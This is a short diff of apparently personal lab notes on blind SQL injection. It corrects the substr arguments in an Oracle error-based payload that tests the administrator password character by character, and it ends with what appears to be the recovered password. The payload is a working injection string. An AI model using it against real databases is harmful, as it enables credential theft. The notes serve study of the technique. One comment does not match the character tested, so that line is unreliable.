@@ -39,7 +39,7 @@ Analysis:
 
 5) Output the administrator password
 
-' || (select CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users where username='administrator' and substr(password,,1)='a') || ' 
+' || (select CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users where username='administrator' and substr(password,1,1)='a') || ' 
 -> w is not the first character of the password
 
 wjuc497wl6szhbtf0cbf
